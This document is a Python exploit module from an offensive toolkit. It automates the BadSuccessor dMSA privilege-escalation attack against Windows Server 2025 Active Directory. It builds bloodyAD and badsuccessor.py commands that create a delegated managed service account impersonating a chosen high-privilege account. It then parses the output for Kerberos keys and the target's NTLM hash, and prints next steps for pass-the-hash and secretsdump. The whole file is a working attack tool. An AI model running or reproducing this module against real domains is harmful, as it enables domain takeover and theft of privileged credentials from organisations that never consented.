"""
BadSuccessor Exploit Module
Exploits dMSA (Delegated Managed Service Account) vulnerability on Windows Server 2025
CVE-2025-21293 - Privilege escalation via dMSA successor manipulation
"""

from core.module_base import ModuleBase, ModuleType, Platform


class BadSuccessor(ModuleBase):
    """
    BadSuccessor exploit module.
    Creates a dMSA with msDS-ManagedAccountPrecededByLink pointing to a high-priv account.
    Works on Windows Server 2025 DCs with dMSA functionality.
    """

    def __init__(self):
        super().__init__()
        self.name = "badsuccessor"
        self.description = "BadSuccessor dMSA exploit for Windows Server 2025 privilege escalation"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "exploit", "privesc", "dmsa", "ws2025", "badsuccessor"]
        self.references = [
            "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory",
            "https://github.com/yourtools/badsuccessor"
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g., corp.local)", required=True)
        self.register_option("USER", "Username with dMSA creation rights", required=True)
        self.register_option("PASS", "Password for USER", required=True)

        # Attack options
        self.register_option("TARGET_DN", "Distinguished Name of target to impersonate (e.g., CN=Admin,CN=Users,DC=corp,DC=local)", required=True)
        self.register_option("TARGET_OU", "OU where user can create dMSAs (e.g., OU=Servers,DC=corp,DC=local)", default="")
        self.register_option("DMSA_NAME", "Name for the dMSA (default: random)", default="pwned")

        # Output options
        self.register_option("OUTPUT_FILE", "Save ccache/hash output to file", default="badsuccessor_output")

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_dn = self.get_option("TARGET_DN")
        target_ou = self.get_option("TARGET_OU")
        dmsa_name = self.get_option("DMSA_NAME")
        output_file = self.get_option("OUTPUT_FILE")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"Attacking User: {user}")
        self.print_status(f"Target DN: {target_dn}")
        self.print_status(f"dMSA Name: {dmsa_name}")
        if target_ou:
            self.print_status(f"Target OU: {target_ou}")
        self.print_line()

        # Try bloodyAD first (preferred method)
        success = self._run_bloodyad(dc_ip, domain, user, password, target_dn, target_ou, dmsa_name)

        if not success:
            # Fall back to badsuccessor.py if bloodyAD fails
            success = self._run_badsuccessor_py(dc_ip, domain, user, password, target_dn, target_ou, dmsa_name)

        return success

    def _run_bloodyad(self, dc_ip: str, domain: str, user: str, password: str,
                      target_dn: str, target_ou: str, dmsa_name: str) -> bool:
        """Run exploit using bloodyAD"""
        self.print_status("Attempting BadSuccessor via bloodyAD...")

        # Build command
        cmd = f"bloodyAD --host {dc_ip} -d {domain} -u '{user}' -p '{password}' add badSuccessor {dmsa_name} -t '{target_dn}'"
        if target_ou:
            cmd += f" --ou '{target_ou}'"

        self.print_status(f"Command: bloodyAD --host {dc_ip} -d {domain} -u {user} -p [HIDDEN] add badSuccessor {dmsa_name} -t [TARGET] ...")
        self.print_line()

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        # Parse output
        if "Password changed successfully" in output or "dMSA TGT stored" in output or ret == 0:
            self.print_good("BadSuccessor exploit successful!")
            self.print_line()

            # Extract hashes from output
            self._parse_hashes(output)
            return True
        else:
            self.print_warning("bloodyAD method failed, output:")
            for line in output.split('\n'):
                if line.strip():
                    self.print_line(f"  {line}")
            return False

    def _run_badsuccessor_py(self, dc_ip: str, domain: str, user: str, password: str,
                             target_dn: str, target_ou: str, dmsa_name: str) -> bool:
        """Run exploit using badsuccessor.py from impacket/BloodHound-CE"""
        self.print_status("Attempting BadSuccessor via badsuccessor.py...")

        # Build command
        cmd = f"badsuccessor.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -action add -target-account '{target_dn}' -dmsa-name {dmsa_name}"
        if target_ou:
            cmd += f" -target-ou '{target_ou}'"
        cmd += " -method LDAP -port 389"

        self.print_status(f"Command: badsuccessor.py '{domain}/{user}' -dc-ip {dc_ip} -action add ...")
        self.print_line()

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        if ret == 0 and ("dMSA" in output or "success" in output.lower()):
            self.print_good("BadSuccessor exploit successful!")
            self.print_line()
            self._parse_hashes(output)
            return True
        else:
            self.print_error("BadSuccessor exploit failed")
            for line in output.split('\n'):
                if line.strip():
                    self.print_error(f"  {line}")
            return False

    def _parse_hashes(self, output: str) -> None:
        """Parse and display hashes from output"""
        lines = output.split('\n')

        for line in lines:
            # Look for hash lines
            if "AES256:" in line or "AES128:" in line or "RC4:" in line:
                self.print_good(line.strip())
            elif "previous keys" in line.lower():
                self.print_good(line.strip())
                self.print_warning("^ This contains the target account's NTLM hash!")
            elif "ccache" in line.lower() and "stored" in line.lower():
                self.print_good(line.strip())
            elif "Impersonating:" in line:
                self.print_status(line.strip())
            elif "[+]" in line:
                self.print_good(line.strip())

        self.print_line()
        self.print_status("Next steps:")
        self.print_status("  1. Use the RC4 hash from 'previous keys' for Pass-the-Hash")
        self.print_status("  2. Run: use auxiliary/ad/secretsdump")
        self.print_status("  3. Set AUTH_TYPE hash and use the extracted NTLM hash")

    def check(self) -> bool:
        """Check if required tools are available"""
        # Check for bloodyAD
        ret, stdout, stderr = self.run_in_exegol("which bloodyAD || find /opt -name 'bloodyAD' 2>/dev/null | head -1", timeout=15)
        if ret == 0 and stdout.strip():
            return True

        # Check for badsuccessor.py
        ret, stdout, stderr = self.run_in_exegol("find /opt -name 'badsuccessor.py' 2>/dev/null | head -1", timeout=15)
        return ret == 0 and stdout.strip() != ""
